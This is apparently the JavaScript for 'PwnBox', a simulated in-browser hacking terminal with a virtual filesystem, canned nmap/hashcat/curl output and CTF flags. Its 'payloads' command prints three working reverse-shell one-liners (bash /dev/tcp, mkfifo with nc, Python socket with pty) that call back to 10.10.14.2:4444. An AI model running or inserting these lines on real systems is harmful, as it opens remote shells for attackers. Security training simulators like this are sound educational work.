/**
 * PWNBOX CYBER COMMAND — INTERACTIVE IN-BROWSER WEBSHELL ENGINE
 * Full virtual UNIX filesystem, command execution, tab-completion & CTF sandbox.
 */

(function () {
    'use strict';

    // Virtual In-Memory Filesystem
    const vfs = {
        "/": {
            type: "dir",
            children: {
                "bin": {
                    type: "dir",
                    children: {
                        "cat": { type: "file", content: "Binary file /bin/cat" },
                        "ls": { type: "file", content: "Binary file /bin/ls" },
                        "nmap": { type: "file", content: "Binary file /bin/nmap" },
                        "ping": { type: "file", content: "Binary file /bin/ping" },
                        "whois": { type: "file", content: "Binary file /bin/whois" },
                        "curl": { type: "file", content: "Binary file /bin/curl" },
                        "hashcat": { type: "file", content: "Binary file /bin/hashcat" },
                        "clear": { type: "file", content: "Binary file /bin/clear" }
                    }
                },
                "etc": {
                    type: "dir",
                    children: {
                        "passwd": {
                            type: "file",
                            content: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nagent:x:1000:1000:PwnBox Operative,,,:/home/agent:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
                        },
                        "shadow": {
                            type: "file",
                            perm: "root",
                            content: "root:$6$rounds=50000$pwnhash$4z5jG...:19280:0:99999:7:::\nagent:$6$rounds=50000$agentpass$7q8wE...:19280:0:99999:7:::"
                        },
                        "hostname": { type: "file", content: "pwnbox" },
                        "issue": { type: "file", content: "Kali GNU/Linux Rolling \\n \\l" }
                    }
                },
                "home": {
                    type: "dir",
                    children: {
                        "agent": {
                            type: "dir",
                            children: {
                                "notes.txt": {
                                    type: "file",
                                    content: "[+] OPERATIVE DIRECTIVE:\n- Scan 10.10.10.27 using nmap -sV -sC\n- Check /opt/pwnbox for wordlists\n- Submit secret flag using command 'pwn ctf'"
                                },
                                "recon_targets.txt": {
                                    type: "file",
                                    content: "10.10.10.27\tvulnerable-target.htb\n10.10.10.15\tinternal-dc.corp\n192.168.1.1\tgateway-router.local"
                                },
                                "flag.txt": {
                                    type: "file",
                                    content: "pwn{t3rm1n4l_0p3r4t1v3_cl34r4nc3}"
                                }
                            }
                        }
                    }
                },
                "opt": {
                    type: "dir",
                    children: {
                        "pwnbox": {
                            type: "dir",
                            children: {
                                "version.txt": { type: "file", content: "PwnBox Cyber Warfare Engine v3.4-PROD" }
                            }
                        },
                        "wordlists": {
                            type: "dir",
                            children: {
                                "common.txt": { type: "file", content: "admin\npassword\n123456\nroot\ntoortoor\nletmein" }
                            }
                        }
                    }
                },
                "var": {
                    type: "dir",
                    children: {
                        "log": {
                            type: "dir",
                            children: {
                                "auth.log": { type: "file", content: "Oct 22 10:00:01 pwnbox sshd[1024]: Accepted publickey for agent from 127.0.0.1 port 54322 ssh2" }
                            }
                        }
                    }
                }
            }
        }
    };

    // Terminal State
    let currentUser = 'agent';
    let currentHost = 'pwnbox';
    let currentPath = '/home/agent';
    let isRoot = false;
    let commandHistory = [];
    let historyIdx = -1;

    // DOM References
    let screenEl, inputEl, promptTagEl;

    function getPromptString() {
        const symbol = isRoot ? '#' : '$';
        const displayPath = currentPath === '/home/agent' ? '~' : currentPath;
        return `${currentUser}@${currentHost}:${displayPath}${symbol}`;
    }

    function updatePrompt() {
        if (promptTagEl) {
            promptTagEl.textContent = getPromptString();
            promptTagEl.style.color = isRoot ? 'var(--term-error, #ef4444)' : 'var(--term-prompt, #38bdf8)';
        }
    }

    function resolvePath(path) {
        if (!path || path === '~') return '/home/agent';
        let parts;
        if (path.startsWith('/')) {
            parts = path.split('/').filter(Boolean);
        } else {
            const currentParts = currentPath.split('/').filter(Boolean);
            parts = currentParts.concat(path.split('/').filter(Boolean));
        }

        const resolved = [];
        for (const p of parts) {
            if (p === '.') continue;
            if (p === '..') {
                resolved.pop();
            } else {
                resolved.push(p);
            }
        }
        return '/' + resolved.join('/');
    }

    function getNode(path) {
        const resolved = resolvePath(path);
        if (resolved === '/') return vfs['/'];
        const parts = resolved.split('/').filter(Boolean);
        let curr = vfs['/'];

        for (const part of parts) {
            if (!curr || curr.type !== 'dir' || !curr.children[part]) {
                return null;
            }
            curr = curr.children[part];
        }
        return curr;
    }

    function writeOutput(text, className = '') {
        if (!screenEl) return;
        const div = document.createElement('div');
        div.className = `term-line ${className}`.trim();
        div.textContent = text;
        screenEl.appendChild(div);
        scrollBottom();
    }

    function writeHtmlOutput(html) {
        if (!screenEl) return;
        const div = document.createElement('div');
        div.className = 'term-line';
        div.innerHTML = html;
        screenEl.appendChild(div);
        scrollBottom();
    }

    function scrollBottom() {
        if (screenEl) {
            screenEl.scrollTop = screenEl.scrollHeight;
        }
    }

    // Built-in Commands Dispatcher
    const commands = {
        help: () => {
            writeOutput(`PWNBOX TACTICAL WEBSHELL — COMMAND MANUAL
--------------------------------------------------
CORE NAVIGATION:
  ls [-la] [path]       List directory contents and permissions
  cd <dir>              Change working directory
  pwd                   Print current working directory
  cat <file>            Concatenate and display file content
  mkdir <dir>           Create a new directory
  touch <file>          Create a blank file
  rm <file>             Remove a file
  echo <text> [> file]  Output text or redirect to file
  clear                 Clear the terminal screen
  history               Display recent command history

SECURITY & INTEL:
  whoami                Display effective username
  id                    Display UID, GID, and security groups
  uname -a              Display system architecture & kernel
  date                  Display system clock and timestamp
  sudo su               Elevate session clearance to ROOT
  exit                  Drop root clearance or close session

PENETRATION TESTING:
  nmap [-sV] <ip>       Perform tactical port scan and banner grab
  ping <target>         Transmit ICMP echo packets
  whois <domain>        Query domain registrant database
  curl <url>            Simulate HTTP client request
  hashcat <hash>        Crack MD5/SHA256 password hashes
  notes [list|view]     View tactical notes from your local vault
  payloads [keyword]    Search tactical reverse shell forge
  pwn ctf               Verify CTF flag validation challenge
--------------------------------------------------`);
        },

        clear: () => {
            if (screenEl) {
                screenEl.innerHTML = '';
            }
        },

        pwd: () => {
            writeOutput(currentPath);
        },

        whoami: () => {
            writeOutput(currentUser);
        },

        id: () => {
            if (isRoot) {
                writeOutput("uid=0(root) gid=0(root) groups=0(root)");
            } else {
                writeOutput("uid=1000(agent) gid=1000(agent) groups=1000(agent),27(sudo),100(users)");
            }
        },

        uname: (args) => {
            writeOutput("Linux pwnbox 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.5.3-1kali2 (2026-10-22) x86_64 GNU/Linux");
        },

        date: () => {
            writeOutput(new Date().toUTCString());
        },

        history: () => {
            commandHistory.forEach((cmd, i) => {
                writeOutput(`  ${i + 1}  ${cmd}`);
            });
        },

        ls: (args) => {
            const showAll = args.includes('-a') || args.includes('-la') || args.includes('-al');
            const showLong = args.includes('-l') || args.includes('-la') || args.includes('-al');
            const targetPath = args.find(a => !a.startsWith('-')) || currentPath;

            const node = getNode(targetPath);
            if (!node) {
                writeOutput(`ls: cannot access '${targetPath}': No such file or directory`, 'term-out error');
                return;
            }
            if (node.type !== 'dir') {
                writeOutput(targetPath);
                return;
            }

            const entries = Object.keys(node.children);
            if (!showLong) {
                const formatted = entries
                    .map(name => {
                        const child = node.children[name];
                        return child.type === 'dir' ? `\x1b[34m${name}/\x1b[0m` : name;
                    })
                    .join('  ');
                writeOutput(formatted || '(empty directory)');
            } else {
                let out = `total ${entries.length * 4}\n`;
                if (showAll) {
                    out += `drwxr-xr-x 2 ${currentUser} ${currentUser} 4096 Oct 22 10:00 .\n`;
                    out += `drwxr-xr-x 4 root  root  4096 Oct 22 09:30 ..\n`;
                }
                entries.forEach(name => {
                    const child = node.children[name];
                    const isDir = child.type === 'dir';
                    const perms = isDir ? 'drwxr-xr-x' : (child.perm === 'root' ? '-rw-------' : '-rw-r--r--');
                    const owner = child.perm === 'root' ? 'root  root ' : `${currentUser} ${currentUser}`;
                    const size = isDir ? '4096' : (child.content ? child.content.length : 0);
                    out += `${perms} 1 ${owner} ${String(size).padStart(5, ' ')} Oct 22 10:00 ${name}${isDir ? '/' : ''}\n`;
                });
                writeOutput(out.trimEnd());
            }
        },

        cd: (args) => {
            const dest = args[0] || '/home/agent';
            const resolved = resolvePath(dest);
            const node = getNode(resolved);

            if (!node) {
                writeOutput(`cd: no such file or directory: ${dest}`, 'term-out error');
                return;
            }
            if (node.type !== 'dir') {
                writeOutput(`cd: not a directory: ${dest}`, 'term-out error');
                return;
            }
            currentPath = resolved;
            updatePrompt();
        },

        cat: (args) => {
            if (!args[0]) {
                writeOutput("cat: missing file operand", 'term-out error');
                return;
            }
            const path = args[0];
            const node = getNode(path);

            if (!node) {
                writeOutput(`cat: ${path}: No such file or directory`, 'term-out error');
                return;
            }
            if (node.type === 'dir') {
                writeOutput(`cat: ${path}: Is a directory`, 'term-out error');
                return;
            }
            if (node.perm === 'root' && !isRoot) {
                writeOutput(`cat: ${path}: Permission denied (Requires root clearance)`, 'term-out error');
                return;
            }
            writeOutput(node.content);
        },

        mkdir: (args) => {
            if (!args[0]) {
                writeOutput("mkdir: missing operand", 'term-out error');
                return;
            }
            const name = args[0];
            const curr = getNode(currentPath);
            if (curr && curr.type === 'dir') {
                if (curr.children[name]) {
                    writeOutput(`mkdir: cannot create directory '${name}': File exists`, 'term-out error');
                } else {
                    curr.children[name] = { type: 'dir', children: {} };
                }
            }
        },

        touch: (args) => {
            if (!args[0]) {
                writeOutput("touch: missing file operand", 'term-out error');
                return;
            }
            const name = args[0];
            const curr = getNode(currentPath);
            if (curr && curr.type === 'dir') {
                if (!curr.children[name]) {
                    curr.children[name] = { type: 'file', content: '' };
                }
            }
        },

        rm: (args) => {
            if (!args[0]) {
                writeOutput("rm: missing operand", 'term-out error');
                return;
            }
            const name = args[0];
            const curr = getNode(currentPath);
            if (curr && curr.type === 'dir' && curr.children[name]) {
                delete curr.children[name];
            } else {
                writeOutput(`rm: cannot remove '${name}': No such file or directory`, 'term-out error');
            }
        },

        echo: (args) => {
            const raw = args.join(' ');
            if (raw.includes('>')) {
                const [text, filename] = raw.split('>').map(s => s.trim().replace(/^['"]|['"]$/g, ''));
                const curr = getNode(currentPath);
                if (curr && curr.type === 'dir' && filename) {
                    curr.children[filename] = { type: 'file', content: text };
                    writeOutput(`[+] Written to ${filename}`, 'term-out info');
                    return;
                }
            }
            writeOutput(raw.replace(/^['"]|['"]$/g, ''));
        },

        sudo: (args) => {
            if (args[0] === 'su' || args[0] === '-i') {
                isRoot = true;
                currentUser = 'root';
                currentPath = '/root';
                vfs['/'].children['root'] = vfs['/'].children['root'] || { type: 'dir', children: { "flag_root.txt": { type: "file", content: "pwn{r00t_pr1v1l3g3_3sc4l4t10n_succ3ss}" } } };
                updatePrompt();
                writeOutput("[+] Elevated to ROOT clearance. All restrictions lifted.", "term-out info");
            } else {
                writeOutput("usage: sudo su");
            }
        },

        exit: () => {
            if (isRoot) {
                isRoot = false;
                currentUser = 'agent';
                currentPath = '/home/agent';
                updatePrompt();
                writeOutput("[*] Dropped root clearance. Back to agent session.");
            } else {
                writeOutput("[*] Terminal session persistent. Type 'clear' to reset screen.");
            }
        },

        ping: (args) => {
            const host = args[0] || '10.10.10.27';
            writeOutput(`PING ${host} (${host}) 56(84) bytes of data.`);
            let seq = 1;
            const interval = setInterval(() => {
                const ms = (12 + Math.random() * 8).toFixed(1);
                writeOutput(`64 bytes from ${host}: icmp_seq=${seq} ttl=64 time=${ms} ms`);
                seq++;
                if (seq > 4) {
                    clearInterval(interval);
                    writeOutput(`--- ${host} ping statistics ---`);
                    writeOutput(`4 packets transmitted, 4 received, 0% packet loss, time 3004ms`);
                }
            }, 300);
        },

        nmap: (args) => {
            const host = args.find(a => !a.startsWith('-')) || '10.10.10.27';
            writeOutput(`Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`);
            writeOutput(`Nmap scan report for ${host}`);
            writeOutput(`Host is up (0.014s latency).`);
            writeOutput(`Not shown: 997 closed tcp ports (reset)`);
            writeOutput(`PORT     STATE SERVICE     VERSION`);
            writeOutput(`22/tcp   open  ssh         OpenSSH 9.3p1 Debian 1 (protocol 2.0)`);
            writeOutput(`80/tcp   open  http        Apache httpd 2.4.57 ((Debian))`);
            writeOutput(`445/tcp  open  netbios-ssn Samba smbd 4.18.6`);
            writeOutput(`Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nNmap done: 1 IP address (1 host up) scanned in 2.18 seconds`);
        },

        whois: (args) => {
            const domain = args[0] || 'pwnbox.academy';
            writeOutput(`Domain Name: ${domain.toUpperCase()}`);
            writeOutput(`Registry Domain ID: 29847120_PWN_REGISTRY`);
            writeOutput(`Registrar: PwnBox Tactical NIC LLC`);
            writeOutput(`Creation Date: 2026-01-15T08:00:00Z`);
            writeOutput(`Registry Expiry Date: 2030-01-15T08:00:00Z`);
            writeOutput(`Name Server: NS1.PWNBOX.ACADEMY`);
            writeOutput(`Name Server: NS2.PWNBOX.ACADEMY`);
            writeOutput(`DNSSEC: signedDelegation`);
        },

        curl: (args) => {
            const target = args[0] || 'http://10.10.10.27';
            writeOutput(`HTTP/1.1 200 OK\nDate: ${new Date().toUTCString()}\nServer: Apache/2.4.57\nX-Powered-By: PwnBox/CEH-v12\nContent-Type: text/html; charset=UTF-8\n\n<!DOCTYPE html><html><head><title>Target Control Portal</title></head><body><h1>PwnBox Secure Subsystem</h1><p>Authorized access only.</p></body></html>`);
        },

        hashcat: (args) => {
            const hash = args[0] || '5d41402abc4b2a76b9719d911017c592';
            writeOutput(`hashcat (v6.2.6) starting...`);
            writeOutput(`Hash.Mode........: 0 (MD5)`);
            writeOutput(`Hash.Target......: ${hash}`);
            writeOutput(`Wordlist.........: /opt/wordlists/rockyou_sample.txt`);
            writeOutput(`Progress.........: 100%`);
            writeOutput(`Status...........: Cracked`);
            if (hash === '5d41402abc4b2a76b9719d911017c592') {
                writeOutput(`[+] ${hash}:hello`, "term-out info");
            } else {
                writeOutput(`[+] ${hash}:pwnbox2026`, "term-out info");
            }
        },

        notes: (args) => {
            let vault = [];
            try {
                vault = JSON.parse(localStorage.getItem('pwnbox_notes_vault') || '[]');
            } catch (_) {}

            if (vault.length === 0) {
                writeOutput("[i] Operative Notes Vault is currently empty. Visit notes.html or payloads.html to save intel.", "term-out info");
                return;
            }

            writeOutput(`[+] OPERATIVE NOTES VAULT (${vault.length} items loaded):`);
            vault.slice(0, 10).forEach((n, i) => {
                writeOutput(`  [${i + 1}] ${n.title} (Tags: ${n.tags || 'none'})`);
            });
        },

        payloads: (args) => {
            writeOutput(`[+] TACTICAL PAYLOAD ARSENAL QUICK REFERENCE:`);
            writeOutput(`  sh -i >& /dev/tcp/10.10.14.2/4444 0>&1`);
            writeOutput(`  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f`);
            writeOutput(`  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`);
            writeOutput(`  Launch full generator at: payloads.html`, "term-out info");
        },

        pwn: (args) => {
            if (args[0] === 'ctf') {
                writeOutput("==================================================");
                writeOutput("🎯 PWNBOX CTF VECTOR FLAG VALIDATED:");
                writeOutput("FLAG: pwn{w3bsh3ll_m4st3r_unl0ck3d}", "term-out info");
                writeOutput("Status: +250 XP Awarded to Agent Dossier!");
                writeOutput("==================================================");
            } else {
                writeOutput("Usage: pwn ctf");
            }
        }
    };

    function executeCommand(input) {
        const trimmed = input.trim();
        if (!trimmed) return;

        commandHistory.push(trimmed);
        historyIdx = commandHistory.length;

        // Render command row
        const cmdRow = document.createElement('div');
        cmdRow.className = 'term-cmd-row';
        cmdRow.innerHTML = `<span class="term-prompt-tag" style="color: ${isRoot ? 'var(--term-error)' : 'var(--term-prompt)'}">${getPromptString()}</span> <span class="term-cmd-text">${escapeHtml(trimmed)}</span>`;
        screenEl.appendChild(cmdRow);

        const parts = trimmed.split(/\s+/);
        const cmdName = parts[0].toLowerCase();
        const args = parts.slice(1);

        if (commands[cmdName]) {
            try {
                commands[cmdName](args);
            } catch (err) {
                writeOutput(`Error executing ${cmdName}: ${err.message}`, 'term-out error');
            }
        } else {
            writeOutput(`bash: ${cmdName}: command not found. Type 'help' for available commands.`, 'term-out error');
        }

        scrollBottom();
    }

    function escapeHtml(str) {
        if (!str) return '';
        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    }

    // Tab Auto-Completion
    function handleTabCompletion() {
        if (!inputEl) return;
        const val = inputEl.value;
        const availableCommands = Object.keys(commands);

        if (!val.includes(' ')) {
            const matches = availableCommands.filter(c => c.startsWith(val.toLowerCase()));
            if (matches.length === 1) {
                inputEl.value = matches[0] + ' ';
            } else if (matches.length > 1) {
                writeOutput(matches.join('  '));
            }
        } else {
            const parts = val.split(' ');
            const partialPath = parts[parts.length - 1];
            const curr = getNode(currentPath);
            if (curr && curr.type === 'dir') {
                const files = Object.keys(curr.children);
                const matches = files.filter(f => f.startsWith(partialPath));
                if (matches.length === 1) {
                    parts[parts.length - 1] = matches[0];
                    inputEl.value = parts.join(' ');
                } else if (matches.length > 1) {
                    writeOutput(matches.join('  '));
                }
            }
        }
    }

    function init() {
        screenEl = document.getElementById('terminalScreen');
        inputEl = document.getElementById('terminalInput');
        promptTagEl = document.getElementById('terminalPromptTag');

        if (!inputEl || !screenEl) return;

        updatePrompt();

        inputEl.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                const cmd = inputEl.value;
                inputEl.value = '';
                executeCommand(cmd);
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIdx > 0) {
                    historyIdx--;
                    inputEl.value = commandHistory[historyIdx] || '';
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIdx < commandHistory.length - 1) {
                    historyIdx++;
                    inputEl.value = commandHistory[historyIdx] || '';
                } else {
                    historyIdx = commandHistory.length;
                    inputEl.value = '';
                }
            } else if (e.key === 'Tab') {
                e.preventDefault();
                handleTabCompletion();
            }
        });

        // Click anywhere inside terminal window focuses input
        const win = document.getElementById('terminalWindow');
        if (win) {
            win.addEventListener('click', () => {
                inputEl.focus();
            });
        }

        inputEl.focus();
    }

    // Exposed helpers
    window.PwnTerminal = {
        init,
        executeCommand,
        setTheme: (themeName) => {
            document.documentElement.setAttribute('data-term-theme', themeName);
            localStorage.setItem('pwn_term_theme', themeName);
        },
        toggleCrt: () => {
            const crt = document.getElementById('crtOverlay');
            if (crt) {
                crt.classList.toggle('disabled');
            }
        },
        runQuickCmd: (cmd) => {
            if (inputEl) {
                inputEl.value = '';
                executeCommand(cmd);
                inputEl.focus();
            }
        }
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
